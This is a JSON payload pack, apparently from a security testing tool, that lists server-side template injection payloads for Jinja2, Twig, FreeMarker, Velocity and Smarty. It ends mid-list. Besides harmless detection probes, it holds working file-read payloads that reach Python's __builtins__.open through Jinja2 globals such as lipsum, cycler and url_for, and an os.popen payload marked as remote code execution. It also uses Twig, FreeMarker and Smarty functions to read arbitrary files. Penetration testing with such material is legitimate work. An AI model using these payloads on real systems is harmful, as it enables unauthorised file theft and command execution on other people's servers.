{
  "pack": "builtin-ssti",
  "category": "ssti",
  "source": "builtin",
  "license": "MIT",
  "templates": [
    {
      "id": "ssti-jinja2-detect-mul",
      "name": "Jinja2 arithmetic probe",
      "category": "ssti",
      "engine": "jinja2",
      "mode": "detection",
      "template": "{{7*7}}",
      "expected": "49",
      "tags": [
        "detection",
        "arithmetic"
      ],
      "notes": "Renders 49 if a Jinja2/Twig-style expression is evaluated."
    },
    {
      "id": "ssti-jinja2-detect-strmul",
      "name": "Jinja2 string multiplication",
      "category": "ssti",
      "engine": "jinja2",
      "mode": "detection",
      "template": "{{7*'7'}}",
      "expected": "7777777",
      "tags": [
        "detection"
      ],
      "notes": "Jinja2 yields 7777777 (string repeat); Twig yields 49. Useful to tell them apart."
    },
    {
      "id": "ssti-jinja2-id-config",
      "name": "Jinja2/Flask config object",
      "category": "ssti",
      "engine": "jinja2",
      "mode": "identification",
      "template": "{{config}}",
      "tags": [
        "identification",
        "flask"
      ],
      "notes": "In Flask, dumps the app config mapping. Confirms Jinja2 + Flask context."
    },
    {
      "id": "ssti-jinja2-id-self",
      "name": "Jinja2 self object",
      "category": "ssti",
      "engine": "jinja2",
      "mode": "identification",
      "template": "{{self}}",
      "tags": [
        "identification"
      ],
      "notes": "Renders a TemplateReference repr in Jinja2."
    },
    {
      "id": "ssti-jinja2-ctx-config",
      "name": "Jinja2 config inspection",
      "category": "ssti",
      "engine": "jinja2",
      "mode": "context",
      "template": "{{config.items()}}",
      "tags": [
        "context",
        "flask"
      ],
      "notes": "Non-destructive: lists Flask config items if available."
    },
    {
      "id": "ssti-jinja2-file-builtins",
      "name": "Jinja2 file read via builtins.open",
      "category": "ssti",
      "engine": "jinja2",
      "mode": "file-read",
      "template": "{{get_flashed_messages.__globals__.__builtins__.open('<<POAD_FILE>>').read()}}",
      "required": [
        "file"
      ],
      "version_dependent": true,
      "tags": [
        "file-read",
        "flask"
      ],
      "notes": "Environment-dependent: needs an accessible global exposing __builtins__ (Flask). Avoids fragile numeric subclass indexes."
    },
    {
      "id": "ssti-jinja2-file-lipsum",
      "name": "Jinja2 file read via lipsum.__globals__",
      "category": "ssti",
      "engine": "jinja2",
      "mode": "file-read",
      "template": "{{lipsum.__globals__.__builtins__.open('<<POAD_FILE>>').read()}}",
      "required": [
        "file"
      ],
      "version_dependent": true,
      "tags": [
        "file-read",
        "jinja2"
      ],
      "notes": "Pure Jinja2 (no Flask needed): lipsum is a global in any Jinja2 env."
    },
    {
      "id": "ssti-jinja2-file-cycler",
      "name": "Jinja2 file read via cycler.__init__.__globals__",
      "category": "ssti",
      "engine": "jinja2",
      "mode": "file-read",
      "template": "{{cycler.__init__.__globals__.__builtins__.open('<<POAD_FILE>>').read()}}",
      "required": [
        "file"
      ],
      "version_dependent": true,
      "tags": [
        "file-read",
        "jinja2"
      ],
      "notes": "Pure Jinja2 fallback when lipsum is unavailable; cycler is also a built-in global."
    },
    {
      "id": "ssti-jinja2-file-request",
      "name": "Jinja2/Flask file read via request.application",
      "category": "ssti",
      "engine": "jinja2",
      "mode": "file-read",
      "template": "{{request.application.__globals__.__builtins__.open('<<POAD_FILE>>').read()}}",
      "required": [
        "file"
      ],
      "version_dependent": true,
      "tags": [
        "file-read",
        "flask"
      ],
      "notes": "Flask-specific: request object reaches __builtins__ via the app globals."
    },
    {
      "id": "ssti-jinja2-file-urlfor",
      "name": "Jinja2/Flask file read via url_for",
      "category": "ssti",
      "engine": "jinja2",
      "mode": "file-read",
      "template": "{{url_for.__globals__.__builtins__.open('<<POAD_FILE>>').read()}}",
      "required": [
        "file"
      ],
      "version_dependent": true,
      "tags": [
        "file-read",
        "flask"
      ],
      "notes": "Flask-specific alternative global exposing __builtins__."
    },
    {
      "id": "ssti-jinja2-file-os-popen",
      "name": "Jinja2/Flask file read via os.popen cat",
      "category": "ssti",
      "engine": "jinja2",
      "mode": "file-read",
      "template": "{{config.__class__.__init__.__globals__['os'].popen('cat <<POAD_FILE>>').read()}}",
      "required": [
        "file"
      ],
      "version_dependent": true,
      "tags": [
        "file-read",
        "flask",
        "rce"
      ],
      "notes": "RCE-based read (uses os.popen cat). Works when open() is blocked but os is reachable; needs shell cat on target."
    },
    {
      "id": "ssti-twig-detect",
      "name": "Twig arithmetic probe",
      "category": "ssti",
      "engine": "twig",
      "mode": "detection",
      "template": "{{7*7}}",
      "expected": "49",
      "tags": [
        "detection",
        "arithmetic"
      ]
    },
    {
      "id": "ssti-twig-id-strmul",
      "name": "Twig string multiplication",
      "category": "ssti",
      "engine": "twig",
      "mode": "identification",
      "template": "{{7*'7'}}",
      "expected": "49",
      "tags": [
        "identification"
      ],
      "notes": "Twig coerces and yields 49 (unlike Jinja2's 7777777)."
    },
    {
      "id": "ssti-twig-id-filter",
      "name": "Twig upper filter",
      "category": "ssti",
      "engine": "twig",
      "mode": "identification",
      "template": "{{'<<POAD_MARKER>>'|upper}}",
      "required": [
        "marker"
      ],
      "tags": [
        "identification"
      ],
      "notes": "Confirms Twig filter syntax by upper-casing the marker."
    },
    {
      "id": "ssti-twig-file-source",
      "name": "Twig source() file read",
      "category": "ssti",
      "engine": "twig",
      "mode": "file-read",
      "template": "{{source('<<POAD_FILE>>')}}",
      "required": [
        "file"
      ],
      "version_dependent": true,
      "tags": [
        "file-read"
      ],
      "notes": "source() returns a template file's raw contents when the loader can reach the path."
    },
    {
      "id": "ssti-twig-file-include",
      "name": "Twig include() file",
      "category": "ssti",
      "engine": "twig",
      "mode": "file-read",
      "template": "{{include('<<POAD_FILE>>')}}",
      "required": [
        "file"
      ],
      "version_dependent": true,
      "tags": [
        "file-read"
      ],
      "notes": "include() renders the file as a template; useful only if the loader path allows it."
    },
    {
      "id": "ssti-freemarker-detect",
      "name": "FreeMarker arithmetic probe",
      "category": "ssti",
      "engine": "freemarker",
      "mode": "detection",
      "template": "${7*7}",
      "expected": "49",
      "tags": [
        "detection",
        "arithmetic"
      ]
    },
    {
      "id": "ssti-freemarker-id-assign",
      "name": "FreeMarker assign",
      "category": "ssti",
      "engine": "freemarker",
      "mode": "identification",
      "template": "<#assign x=7*7>${x}",
      "expected": "49",
      "tags": [
        "identification"
      ]
    },
    {
      "id": "ssti-freemarker-file-include",
      "name": "FreeMarker include file",
      "category": "ssti",
      "engine": "freemarker",
      "mode": "file-read",
      "template": "<#include '<<POAD_FILE>>'>",
      "required": [
        "file"
      ],
      "version_dependent": true,
      "tags": [
        "file-read"
      ],
      "notes": "Includes the file as a template; subject to FreeMarker loader restrictions."
    },
    {
      "id": "ssti-velocity-detect",
      "name": "Velocity arithmetic probe",
      "category": "ssti",
      "engine": "velocity",
      "mode": "detection",
      "template": "#set($x=7*7)${x}",
      "expected": "49",
      "tags": [
        "detection",
        "arithmetic"
      ]
    },
    {
      "id": "ssti-velocity-id-if",
      "name": "Velocity conditional",
      "category": "ssti",
      "engine": "velocity",
      "mode": "identification",
      "template": "#set($a=1)#if($a==1)<<POAD_MARKER>>#end",
      "required": [
        "marker"
      ],
      "tags": [
        "identification"
      ],
      "notes": "Emits the marker only if Velocity directives are evaluated."
    },
    {
      "id": "ssti-smarty-id-version",
      "name": "Smarty version",
      "category": "ssti",
      "engine": "smarty",
      "mode": "identification",
      "template": "{$smarty.version}",
      "tags": [
        "identification"
      ],
      "notes": "Prints the Smarty version string."
    },
    {
      "id": "ssti-smarty-detect-math",
      "name": "Smarty math function",
      "category": "ssti",
      "engine": "smarty",
      "mode": "detection",
      "template": "{math equation='7*7'}",
      "expected": "49",
      "tags": [
        "detection"
      ]
    },
    {
      "id": "ssti-smarty-file-fetch",
      "name": "Smarty fetch() file",
      "category": "ssti",
      "engine": "smarty",
      "mode": "file-read",
      "template": "{fetch file='<<POAD_FILE>>'}",
      "required": [
        "file"
      ],
      "version_dependent": true,
      "tags": [
        "file-read"
      ],
      "notes": "fetch returns file contents when SECURITY allows local file access."
    },
    {
